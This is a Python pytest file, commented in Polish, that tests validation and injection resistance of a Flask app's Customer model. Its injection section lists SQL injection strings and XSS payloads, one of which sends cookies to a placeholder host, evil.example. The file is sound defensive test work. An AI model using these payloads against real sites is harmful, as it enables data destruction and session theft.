"""
Rozszerzony zestaw testów jednostkowych dla klasy Customer
(project/customers/models.py).

Założenie zadania: testy opisują POPRAWNE zachowanie. Jeśli klasa nie waliduje
danych (obiekt tworzy się mimo błędnych danych), odpowiedni test ma się nie
udać - świadczy to o luce w walidacji, a nie o błędzie w teście.

Uruchomienie (z katalogu Flask_Book_Library):
    python -m pytest test/customers -v
"""
import os
import sys
import time

import pytest
from sqlalchemy.exc import SQLAlchemyError

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from project import app, db  # noqa: E402
from project.customers.models import Customer  # noqa: E402

# Wyjątki, które uznajemy za "poprawne odrzucenie" złych danych.
REJECTED = (ValueError, TypeError, OverflowError, SQLAlchemyError)

VALID = dict(name="Jan Kowalski", city="Warszawa", age=30,
             pesel="44051401359", street="Marszalkowska", appNo="12A")


def make(**overrides):
    return Customer(**{**VALID, **overrides})


def persist(customer):
    """Zapis do bazy; przy błędzie robi rollback i przepuszcza wyjątek."""
    try:
        db.session.add(customer)
        db.session.commit()
    except Exception:
        db.session.rollback()
        raise


def assert_rejected(**overrides):
    """Obiekt z podanymi polami NIE powinien dać się utworzyć ani zapisać."""
    with pytest.raises(REJECTED):
        persist(make(**overrides))


@pytest.fixture(autouse=True)
def clean_db():
    app.config["TESTING"] = True
    with app.app_context():
        db.session.rollback()
        Customer.query.delete()
        db.session.commit()
        yield
        db.session.rollback()
        Customer.query.delete()
        db.session.commit()


@pytest.fixture
def client():
    return app.test_client()


# --------------------------------------------------------------------------
# 1. Poprawne dane
# --------------------------------------------------------------------------
class TestValidData:
    def test_constructor_sets_all_fields(self):
        c = make()
        assert (c.name, c.city, c.age, c.pesel, c.street, c.appNo) == (
            "Jan Kowalski", "Warszawa", 30, "44051401359", "Marszalkowska", "12A")

    def test_persist_and_read_back(self):
        persist(make())
        c = Customer.query.filter_by(name="Jan Kowalski").one()
        assert c.id is not None
        assert c.city == "Warszawa"
        assert c.age == 30
        assert c.pesel == "44051401359"
        assert c.street == "Marszalkowska"
        assert c.appNo == "12A"

    def test_polish_diacritics_are_preserved(self):
        persist(make(name="Żółć Gęślą", city="Łódź", street="Św. Jana"))
        c = Customer.query.one()
        assert (c.name, c.city, c.street) == ("Żółć Gęślą", "Łódź", "Św. Jana")

    def test_repr_contains_data(self):
        r = repr(make())
        assert "Jan Kowalski" in r and "Warszawa" in r and "44051401359" in r

    def test_ids_are_unique_and_autoincremented(self):
        persist(make(name="A"))
        persist(make(name="B"))
        ids = [c.id for c in Customer.query.order_by(Customer.id)]
        assert len(set(ids)) == 2 and ids[0] < ids[1]

    def test_duplicate_name_is_rejected(self):
        persist(make())
        with pytest.raises(SQLAlchemyError):
            persist(make(pesel="02070803628"))

    @pytest.mark.parametrize("age", [0, 1, 18, 65, 120])
    def test_reasonable_ages_accepted(self, age):
        persist(make(age=age))
        assert Customer.query.one().age == age

    def test_boundary_length_strings_accepted(self):
        persist(make(name="n" * 64, city="c" * 64, street="s" * 128,
                     appNo="1" * 10, pesel="9" * 11))
        c = Customer.query.one()
        assert len(c.name) == 64 and len(c.street) == 128 and len(c.appNo) == 10


# --------------------------------------------------------------------------
# 2. Niezgodne typy danych
# --------------------------------------------------------------------------
class TestWrongTypes:
    @pytest.mark.parametrize("age", ["abc", "thirty", "3.5.1", "", "  ", "NaN"])
    def test_age_as_non_numeric_string(self, age):
        assert_rejected(age=age)

    @pytest.mark.parametrize("age", [30.5, [30], {"a": 1}, (30,), object()])
    def test_age_as_wrong_type(self, age):
        assert_rejected(age=age)

    @pytest.mark.parametrize("field", ["name", "city", "pesel", "street", "appNo"])
    @pytest.mark.parametrize("value", [123, 4.5, True, ["x"], {"k": "v"}, b"bytes"])
    def test_string_field_as_non_string(self, field, value):
        assert_rejected(**{field: value})

    @pytest.mark.parametrize("field", ["name", "city", "age", "pesel", "street", "appNo"])
    def test_none_in_required_field(self, field):
        assert_rejected(**{field: None})

    def test_age_as_bool(self):
        assert_rejected(age=True)

    def test_pesel_with_letters(self):
        assert_rejected(pesel="ABCDEFGHIJK")


# --------------------------------------------------------------------------
# 3. Zbyt długie stringi, dziwne znaki, puste pola
# --------------------------------------------------------------------------
class TestStringsAndEmptyFields:
    @pytest.mark.parametrize("field,limit", [
        ("name", 64), ("city", 64), ("street", 128), ("appNo", 10), ("pesel", 64)])
    def test_string_longer_than_column_limit(self, field, limit):
        assert_rejected(**{field: "x" * (limit + 1)})

    def test_pesel_must_have_11_digits(self):
        assert_rejected(pesel="123")
        assert_rejected(pesel="1" * 12)

    @pytest.mark.parametrize("field", ["name", "city", "pesel", "street", "appNo"])
    @pytest.mark.parametrize("value", ["", " ", "   ", "\t", "\n"])
    def test_empty_or_blank_field(self, field, value):
        assert_rejected(**{field: value})

    @pytest.mark.parametrize("value", [
        "Jan\x00Kowalski",          # null byte
        "Jan\x07\x08Kowalski",      # znaki sterujące
        "Jan\r\nKowalski",          # CRLF
        "‮Jan Kowalski",       # RTL override
        "Jan�Kowalski",        # replacement char
    ])
    def test_control_and_strange_characters_in_name(self, value):
        assert_rejected(name=value)

    @pytest.mark.parametrize("value", ["😀😀😀", "名前", "​​", "ｊａｎ"])
    def test_exotic_unicode_in_name(self, value):
        assert_rejected(name=value)

    def test_name_with_leading_trailing_whitespace_is_not_stored_raw(self):
        persist(make(name="   Jan Kowalski   "))
        assert Customer.query.one().name == "Jan Kowalski"

    def test_unique_name_is_case_insensitive(self):
        persist(make(name="Jan Kowalski"))
        with pytest.raises(SQLAlchemyError):
            persist(make(name="JAN KOWALSKI", pesel="02070803628"))

    def test_appno_with_special_chars(self):
        assert_rejected(appNo="!@#$%^&*()")


# --------------------------------------------------------------------------
# 4. Wiek poza zakresem
# --------------------------------------------------------------------------
class TestAgeLimits:
    @pytest.mark.parametrize("age", [-1, -18, -100, -(2 ** 31)])
    def test_negative_age(self, age):
        assert_rejected(age=age)

    @pytest.mark.parametrize("age", [2 ** 31, 2 ** 31 - 1, 2 ** 32, 999999999])
    def test_age_above_realistic_or_int32_limit(self, age):
        assert_rejected(age=age)

    @pytest.mark.parametrize("age", [2 ** 63, 2 ** 64, 10 ** 30, -(2 ** 63) - 1, -(10 ** 30)])
    def test_age_beyond_64bit(self, age):
        assert_rejected(age=age)

    @pytest.mark.parametrize("age", [121, 150, 200, 1000])
    def test_age_unrealistically_high(self, age):
        assert_rejected(age=age)

    def test_age_infinity_and_nan(self):
        assert_rejected(age=float("inf"))
        assert_rejected(age=float("nan"))


# --------------------------------------------------------------------------
# 5. Injection (SQL / JavaScript)
# --------------------------------------------------------------------------
SQL_PAYLOADS = [
    "'; DROP TABLE customers; --",
    "' OR '1'='1",
    "Robert'); DROP TABLE customers;--",
    "1; DELETE FROM customers",
    "' UNION SELECT name, city, age, pesel, street, appNo, 1 FROM customers --",
]
JS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>document.location='http://evil.example/?c='+document.cookie</script>",
]


class TestInjection:
    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_does_not_damage_database(self, payload):
        """ORM używa zapytań parametryzowanych - tabela i dane muszą przetrwać."""
        persist(make(name="Ofiara"))
        try:
            persist(make(name=payload[:64], pesel="02070803628"))
        except REJECTED:
            pass
        assert Customer.query.filter_by(name="Ofiara").count() == 1

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_lookup_returns_nothing_extra(self, payload):
        persist(make(name="Ofiara"))
        persist(make(name="Druga", pesel="02070803628"))
        assert Customer.query.filter_by(name=payload).count() == 0

    @pytest.mark.parametrize("field", ["name", "city", "street", "appNo", "pesel"])
    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_should_be_rejected_by_validation(self, field, payload):
        assert_rejected(**{field: payload[:10] if field == "appNo" else payload})

    @pytest.mark.parametrize("field", ["name", "city", "street", "appNo"])
    @pytest.mark.parametrize("payload", JS_PAYLOADS)
    def test_js_payload_should_be_rejected_or_sanitized(self, field, payload):
        value = payload[:10] if field == "appNo" else payload
        try:
            persist(make(**{field: value}))
        except REJECTED:
            return  # odrzucone - OK
        stored = getattr(Customer.query.one(), field)
        assert "<" not in stored and "javascript:" not in stored.lower(), \
            f"Niebezpieczny ładunek zapisany bez zmian: {stored!r}"

    @pytest.mark.parametrize("payload", JS_PAYLOADS[:3])
    def test_js_payload_is_not_rendered_unescaped_in_html(self, client, payload):
        """Stored XSS: dane wysłane formularzem nie mogą trafić do HTML-a surowe."""
        client.post("/customers/create", data={**VALID, "name": payload})
        html = client.get("/customers/").get_data(as_text=True)
        assert payload not in html, "Stored XSS: ładunek wyrenderowany bez escapowania"

    def test_sql_payload_via_form_does_not_break_listing(self, client):
        client.post("/customers/create", data={**VALID, "name": "' OR 1=1; --"})
        assert client.get("/customers/json").status_code == 200


# --------------------------------------------------------------------------
# 6. Test ekstremalny - duża liczba obiektów
# --------------------------------------------------------------------------
class TestExtreme:
    N = 10_000

    def test_create_many_objects_in_memory(self):
        objs = [make(name=f"Klient {i}", age=i % 100) for i in range(self.N)]
        assert len(objs) == self.N
        assert len({o.name for o in objs}) == self.N

    def test_bulk_persist_many_objects(self):
        start = time.perf_counter()
        db.session.add_all(
            make(name=f"Klient {i}", age=i % 100, pesel=str(i).zfill(11))
            for i in range(self.N))
        db.session.commit()
        elapsed = time.perf_counter() - start

        assert Customer.query.count() == self.N
        assert elapsed < 30, f"Zapis {self.N} rekordów trwał {elapsed:.1f}s"

    def test_many_objects_have_unique_ids_and_correct_data(self):
        db.session.add_all(make(name=f"K{i}", age=i % 100) for i in range(2000))
        db.session.commit()
        rows = Customer.query.all()
        assert len({c.id for c in rows}) == 2000
        assert all(0 <= c.age < 100 for c in rows)

    def test_many_objects_with_max_length_fields(self):
        db.session.add_all(
            make(name=str(i).zfill(64), city="c" * 64, street="s" * 128,
                 appNo="1" * 10, pesel="9" * 11)
            for i in range(2000))
        db.session.commit()
        assert Customer.query.count() == 2000

    def test_many_duplicates_are_all_rejected(self):
        persist(make(name="Jedyny"))
        rejected = 0
        for _ in range(200):
            try:
                persist(make(name="Jedyny"))
            except SQLAlchemyError:
                rejected += 1
        assert rejected == 200
        assert Customer.query.count() == 1

    def test_listing_json_with_many_customers(self, client):
        db.session.add_all(make(name=f"K{i}") for i in range(5000))
        db.session.commit()
        resp = client.get("/customers/json")
        assert resp.status_code == 200
        assert len(resp.get_json()["customers"]) == 5000
